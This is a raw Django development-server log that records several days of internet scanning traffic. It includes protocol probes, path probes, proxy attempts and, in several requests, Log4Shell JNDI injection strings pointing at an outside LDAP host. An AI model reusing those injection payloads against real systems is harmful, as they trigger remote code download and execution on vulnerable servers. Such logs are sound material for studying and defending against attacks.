Watching for file changes with StatReloader
Performing system checks...

System check identified some issues:
Bad Request: /nice ports,/Trinity.txt.bak
[23/Dec/2021 01:06:18] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 400 60498
[23/Dec/2021 01:06:18] code 400, message Bad request syntax ('\x05\x04\x00\x01\x02\x80\x05\x01\x00\x03')
[23/Dec/2021 01:06:18] "  " 400 -
[23/Dec/2021 01:06:24] code 400, message Bad request syntax ('\x04\x01\x00\x16\x7f\x00\x00\x01root\x00')
[23/Dec/2021 01:06:24] "   root " 400 -
Invalid HTTP_HOST header: '3p8g.l.time4vps.cloud:8000'. You may need to add '3p8g.l.time4vps.cloud' to ALLOWED_HOSTS.
Bad Request: /
[23/Dec/2021 01:06:24] "OPTIONS / HTTP/1.0" 400 60217
[23/Dec/2021 01:06:25] code 400, message Bad request version ('RTSP/1.0')
[23/Dec/2021 01:06:25] "OPTIONS / RTSP/1.0" 400 -
[23/Dec/2021 01:06:30] code 400, message Bad request version ('\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
[23/Dec/2021 01:06:30] "  (rþ          |                    " 400 -
[23/Dec/2021 01:06:36] code 400, message Bad HTTP/0.9 request type ('\x00')
[23/Dec/2021 01:06:36] "          versionbind   " 400 -
[23/Dec/2021 01:06:41] code 400, message Bad HTTP/0.9 request type ('\x00')
[23/Dec/2021 01:06:41] "            " 400 -
[23/Dec/2021 01:06:41] code 400, message Bad request syntax ('HELP')
[23/Dec/2021 01:06:41] "HELP" 400 -
[23/Dec/2021 01:06:42] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00')
[23/Dec/2021 01:06:42] You're accessing the development server over HTTPS, but it only supports HTTP.

[23/Dec/2021 01:06:42] code 400, message Bad request version ('\x00/\x00')
[23/Dec/2021 01:06:42] You're accessing the development server over HTTPS, but it only supports HTTP.

[23/Dec/2021 01:06:43] code 400, message Bad request syntax ('\x00\x00\x00qj\x81n0\x81k¡\x03\x02\x01\x05¢\x03\x02\x01')
[23/Dec/2021 01:06:43] "   qjn0k¡¢" 400 -
[23/Dec/2021 01:06:48] code 400, message Bad request version ('0.12\x00')
[23/Dec/2021 01:06:48] "   ¤ÿSMBr    @              @     PC NETWORK PROGRAM 1.0 MICROSOFT NETWORKS 1.03 MICROSOFT NETWORKS 3.0 LANMAN1.0 LM1.2X002 Samba NT LANMAN 1.0 NT LM 0.12 " 400 -
[23/Dec/2021 01:06:48] code 400, message Bad request syntax ('\x01default')
[23/Dec/2021 01:06:48] "default" 400 -
[23/Dec/2021 01:06:49] code 400, message Bad request syntax ('0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00')
[23/Dec/2021 01:06:49] "0   -c   $ " 400 -
[23/Dec/2021 01:06:55] code 400, message Bad HTTP/0.9 request type ('0')
[23/Dec/2021 01:06:55] "0`  " 400 -
[23/Dec/2021 01:06:55] code 400, message Bad request version ('SIP/2.0')
[23/Dec/2021 01:06:55] "OPTIONS sip:nm SIP/2.0" 400 -
[23/Dec/2021 01:07:00] code 400, message Bad request syntax ('TNMP\x04\x00\x00\x00TNME\x00\x00\x04\x00')
[23/Dec/2021 01:07:00] "TNMP   TNME   " 400 -
[23/Dec/2021 01:07:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00')
[23/Dec/2021 01:07:06] "  à     " 400 -
[23/Dec/2021 01:07:11] code 400, message Bad request syntax ('DmdT\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x11\x11\x00ÿ\x01ÿ\x13')
[23/Dec/2021 01:07:11] "DmdT           ÿÿ" 400 -
[23/Dec/2021 01:07:16] code 400, message Bad HTTP/0.9 request type (':\x00\x00\x00/\x00\x00\x00\x02\x00\x00@\x02\x0f\x00\x01\x00=\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x00\x00\x00\x00\x00\x00\x00\x00\x00@')
[23/Dec/2021 01:07:16] ":   /     @  =            /         @                 " 400 -
[23/Dec/2021 01:07:21] code 400, message Bad request syntax ('JRMI\x00\x02K')
[23/Dec/2021 01:07:21] "JRMI K" 400 -
[23/Dec/2021 01:07:27] code 400, message Bad request version ('\x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
[23/Dec/2021 01:07:27] "  ýÎú°    MMS                    ðððð    N S P l a y e r / 9 . 0 . 0 . 2 9 8 0 ;   { 0 0 0 0 A A 0 0 - 0 A 0 0 - 0 0 a 0 - A A 0 A - 0 0 0 0 A 0 A A 0 A A 0 }   àmß_" 400 -
[23/Dec/2021 01:07:32] code 400, message Bad HTTP/0.9 request type ('\x00Z\x00\x00\x01\x00\x00\x00\x016\x01,\x00\x00\x08\x00\x7fÿ\x7f\x08\x00\x00\x00\x01\x00')
[23/Dec/2021 01:07:32] " Z     6,   ÿ      :                4æ           (CONNECT_DATA=(COMMAND=version))" 400 -
[23/Dec/2021 01:07:37] code 400, message Bad request version ('\x03\x00(\x00\x04ÿ\x08\x00\x01U\x00\x00\x00MSSQLServer\x00H\x0f\x00\x00')
[23/Dec/2021 01:07:37] " 4            ( ÿ U   MSSQLServer H  " 400 -
[23/Dec/2021 01:07:42] code 400, message Bad request syntax ('\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x0f\x00')
[23/Dec/2021 01:07:42] "              " 400 -
[23/Dec/2021 01:07:48] code 400, message Bad request syntax ('GIOP\x01\x00\x01\x00$\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00abcdef\x00\x00\x04\x00\x00\x00get\x00\x00\x00\x00\x00')
[23/Dec/2021 01:07:48] "GIOP  $                abcdef     get     " 400 -
Invalid HTTP_HOST header: '3p8g.l.time4vps.cloud:8000'. You may need to add '3p8g.l.time4vps.cloud' to ALLOWED_HOSTS.
Bad Request: /
[23/Dec/2021 01:07:48] "GET / HTTP/1.1" 400 60189
[23/Dec/2021 01:09:00] code 400, message Bad HTTP/0.9 request type ('t3')
[23/Dec/2021 01:09:00] "t3 12.1.2" 400 -
Not Found: /text4041640221739
[23/Dec/2021 01:09:00] "GET /text4041640221739 HTTP/1.1" 404 4196
Not Found: /HNAP1
[23/Dec/2021 01:09:01] "GET /HNAP1 HTTP/1.1" 404 4160
[23/Dec/2021 01:09:03] "GET / HTTP/1.1" 302 0
Not Found: /evox/about
[23/Dec/2021 01:09:05] "GET /evox/about HTTP/1.1" 404 4175
Not Found: /sdk
[23/Dec/2021 01:09:08] "POST /sdk HTTP/1.1" 404 4155
[23/Dec/2021 01:09:14] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x032¼\x9d3¸}')
[23/Dec/2021 01:09:14] You're accessing the development server over HTTPS, but it only supports HTTP.

[23/Dec/2021 01:09:14] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03¯ü!h\x9aäXòåâªÿÂ\x82É\x8aÏUÓÂLdä]|ÕÝw\x97¿h\x96\x00\x00Ú\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00')
[23/Dec/2021 01:09:14] You're accessing the development server over HTTPS, but it only supports HTTP.

[23/Dec/2021 01:09:39] "GET / HTTP/1.1" 302 0
[23/Dec/2021 01:09:39] "GET /authentication/login?next=/ HTTP/1.1" 200 7415
[23/Dec/2021 01:09:40] "GET /static/images/favicon.ico HTTP/1.1" 200 15406
Not Found: /robots.txt
[23/Dec/2021 01:09:41] "GET /robots.txt HTTP/1.1" 404 4175
[23/Dec/2021 01:19:34] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[23/Dec/2021 01:19:34] "    c                           " 400 -
[23/Dec/2021 03:17:20] "GET / HTTP/1.1" 302 0
[23/Dec/2021 03:17:20] "GET /authentication/login?next=/ HTTP/1.1" 200 7415
[23/Dec/2021 03:36:59] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[23/Dec/2021 03:36:59] "Z¥     " 400 -
[23/Dec/2021 03:54:48] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[23/Dec/2021 03:54:48] "Z¥     " 400 -
[23/Dec/2021 03:54:48,084] - Broken pipe from ('188.166.40.32', 45296)

[23/Dec/2021 04:32:06] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[23/Dec/2021 04:32:06] "Z¥     " 400 -
[23/Dec/2021 09:01:12] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[23/Dec/2021 09:01:12] "    c                           " 400 -
[23/Dec/2021 11:00:44] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[23/Dec/2021 11:00:44] "Z¥     " 400 -
[23/Dec/2021 11:00:44,394] - Broken pipe from ('188.166.40.32', 39464)

[23/Dec/2021 11:02:46] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[23/Dec/2021 11:02:46] "    c                           " 400 -
[23/Dec/2021 11:22:22] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[23/Dec/2021 11:22:22] "Z¥     " 400 -
[23/Dec/2021 11:22:22,273] - Broken pipe from ('188.166.40.32', 39840)

[23/Dec/2021 12:12:54] "GET / HTTP/1.0" 302 0
Not Found: /${jndi:ldap://142.93.172.227:1389/Exploit}
[23/Dec/2021 16:43:13] "GET /${jndi:ldap://142.93.172.227:1389/Exploit} HTTP/1.1" 404 4270
[23/Dec/2021 16:43:13] "GET / HTTP/1.1" 302 0
[23/Dec/2021 16:43:13] "GET / HTTP/1.1" 302 0
[23/Dec/2021 16:43:13] "GET /?s=${jndi:ldap://142.93.172.227:1389/Exploit} HTTP/1.1" 302 0
[23/Dec/2021 17:47:29] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[23/Dec/2021 17:47:29] "Z¥     " 400 -
[23/Dec/2021 17:47:29,314] - Broken pipe from ('205.185.122.46', 49422)

[23/Dec/2021 17:47:39] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[23/Dec/2021 17:47:39] "    c                           " 400 -
[23/Dec/2021 19:23:12] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[23/Dec/2021 19:23:12] "    c                           " 400 -
[23/Dec/2021 20:43:26] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[23/Dec/2021 20:43:26] "    c                           " 400 -
Invalid HTTP_HOST header: '3p8g.l.time4vps.cloud:8000'. You may need to add '3p8g.l.time4vps.cloud' to ALLOWED_HOSTS.
Bad Request: /
[23/Dec/2021 21:14:00] "HEAD / HTTP/1.0" 400 60197
Not Found: /system_api.php
[23/Dec/2021 21:14:00] "GET /system_api.php HTTP/1.1" 404 4187
Not Found: /c/version.js
[23/Dec/2021 21:14:00] "GET /c/version.js HTTP/1.1" 404 4181
Not Found: /streaming/clients_live.php
[23/Dec/2021 21:14:00] "GET /streaming/clients_live.php HTTP/1.1" 404 4223
Not Found: /stalker_portal/c/version.js
[23/Dec/2021 21:14:00] "GET /stalker_portal/c/version.js HTTP/1.1" 404 4226
Not Found: /stream/live.php
[23/Dec/2021 21:14:01] "GET /stream/live.php HTTP/1.1" 404 4190
Not Found: /flu/403.html
[23/Dec/2021 21:14:01] "GET /flu/403.html HTTP/1.1" 404 4181
[23/Dec/2021 21:14:01] "GET / HTTP/1.1" 302 0
[23/Dec/2021 21:14:01] "GET /authentication/login?next=/ HTTP/1.1" 200 7415
Not Found: /status
[23/Dec/2021 21:26:33] "GET /status HTTP/1.1" 404 4163
Not Found: /stat
[23/Dec/2021 21:26:33] "GET /stat HTTP/1.1" 404 4157
[23/Dec/2021 22:33:22] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[23/Dec/2021 22:33:22] "Z¥     " 400 -
[24/Dec/2021 01:35:50] "GET / HTTP/1.1" 302 0
[24/Dec/2021 02:13:13] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[24/Dec/2021 02:13:13] "Z¥     " 400 -
[24/Dec/2021 02:13:13,450] - Broken pipe from ('198.98.49.124', 44196)

[24/Dec/2021 06:54:42] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03ÿºìÎ79Ay\x99\x9btjèx´ºîïXW4U´8]WÊÕå×+ÿ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
[24/Dec/2021 06:54:42] You're accessing the development server over HTTPS, but it only supports HTTP.

[24/Dec/2021 13:37:17] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[24/Dec/2021 13:37:17] "Z¥     " 400 -
[24/Dec/2021 21:26:35] "GET / HTTP/1.1" 302 0
[24/Dec/2021 23:29:14] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[24/Dec/2021 23:29:14] "Z¥     " 400 -
[24/Dec/2021 23:29:14,651] - Broken pipe from ('198.98.49.124', 48646)

[25/Dec/2021 02:22:38] "GET / HTTP/1.0" 302 0
Invalid HTTP_HOST header: '3p8g.l.time4vps.cloud:8000'. You may need to add '3p8g.l.time4vps.cloud' to ALLOWED_HOSTS.
Bad Request: /
[26/Dec/2021 12:35:24] "GET / HTTP/1.0" 400 60190
[26/Dec/2021 17:18:01] "GET / HTTP/1.1" 302 0
[26/Dec/2021 17:18:01] "GET /authentication/login?next=/ HTTP/1.1" 200 7415
[26/Dec/2021 17:18:03] "GET /static/images/favicon.ico HTTP/1.1" 200 15406
[26/Dec/2021 17:18:10] code 400, message Bad request syntax ('\x03Ë£Èa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
[26/Dec/2021 17:18:10] "Ë£Èa                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            " 400 -
[27/Dec/2021 01:45:34] "GET / HTTP/1.1" 302 0
[27/Dec/2021 03:41:28] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[27/Dec/2021 03:41:28] "    c                           " 400 -
[27/Dec/2021 04:17:31] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[27/Dec/2021 04:17:31] "Z¥     " 400 -
[27/Dec/2021 04:17:31,559] - Broken pipe from ('205.185.122.46', 54212)

[27/Dec/2021 09:01:22] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[27/Dec/2021 09:01:22] "    c                           " 400 -
[27/Dec/2021 09:27:29] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[27/Dec/2021 09:27:29] "    c                           " 400 -
[27/Dec/2021 09:56:13] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[27/Dec/2021 09:56:13] "    c                           " 400 -
[27/Dec/2021 10:25:34] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[27/Dec/2021 10:25:34] "    c                           " 400 -
[27/Dec/2021 10:49:59] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[27/Dec/2021 10:49:59] "    c                           " 400 -
[27/Dec/2021 11:28:24] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[27/Dec/2021 11:28:24] "    c                           " 400 -
[27/Dec/2021 12:06:09] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[27/Dec/2021 12:06:09] "    c                           " 400 -
[27/Dec/2021 12:38:29] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[27/Dec/2021 12:38:29] "    c                           " 400 -
[27/Dec/2021 13:02:57] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
[27/Dec/2021 13:02:57] "    c                           " 400 -
[27/Dec/2021 13:13:34] code 400, message Bad request syntax ('\x00\x00\x000ipcam\x00\x00\x00\x00\x00\x00\x00\x00\x00')
[27/Dec/2021 13:13:34] "   0ipcam         " 400 -
[27/Dec/2021 13:37:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[27/Dec/2021 13:37:12] "  /*à     Cookie: mstshash=Administr" 400 -
[27/Dec/2021 14:32:00] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
[27/Dec/2021 14:32:00] "  /*à     Cookie: mstshash=Administr" 400 -
[27/Dec/2021 19:12:49] "GET / HTTP/1.1" 302 0
[27/Dec/2021 19:12:49] "GET /authentication/login?next=/ HTTP/1.1" 200 7415
Invalid HTTP_HOST header: 'fuwu.sogou.com'. You may need to add 'fuwu.sogou.com' to ALLOWED_HOSTS.
Bad Request: /http:/fuwu.sogou.com/404/index.html
[27/Dec/2021 20:00:14] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 400 61225
Invalid HTTP_HOST header: 'fuwu.sogou.com'. You may need to add 'fuwu.sogou.com' to ALLOWED_HOSTS.
[27/Dec/2021 20:00:14] code 400, message Bad request version ('À\x14À')
[27/Dec/2021 20:00:14] You're accessing the development server over HTTPS, but it only supports HTTP.

Bad Request: /http:/fuwu.sogou.com/404/index.html
[27/Dec/2021 20:00:14] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 400 61233
[27/Dec/2021 20:00:21] code 400, message Bad request syntax ('\x05\x01\x00')
[27/Dec/2021 20:00:21] " " 400 -
[27/Dec/2021 20:00:21,945] - Broken pipe from ('222.186.19.235', 52458)

[27/Dec/2021 21:39:12] "GET / HTTP/1.1" 302 0
[27/Dec/2021 21:39:12] "GET /authentication/login?next=/ HTTP/1.1" 200 7415
[28/Dec/2021 00:53:06] "GET / HTTP/1.1" 302 0
[28/Dec/2021 00:53:06] "GET /authentication/login?next=/ HTTP/1.1" 200 7415
[28/Dec/2021 15:23:41] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
[28/Dec/2021 15:23:41] "Z¥     " 400 -
Invalid HTTP_HOST header: '161.97.119.209:25562'. You may need to add '161.97.119.209' to ALLOWED_HOSTS.
Bad Request: /161.97.119.209:25562
[28/Dec/2021 17:58:26] "CONNECT 161.97.119.209:25562 HTTP/1.1" 400 60480
Invalid HTTP_HOST header: '161.97.119.209:25561'. You may need to add '161.97.119.209' to ALLOWED_HOSTS.
Bad Request: /161.97.119.209:25561
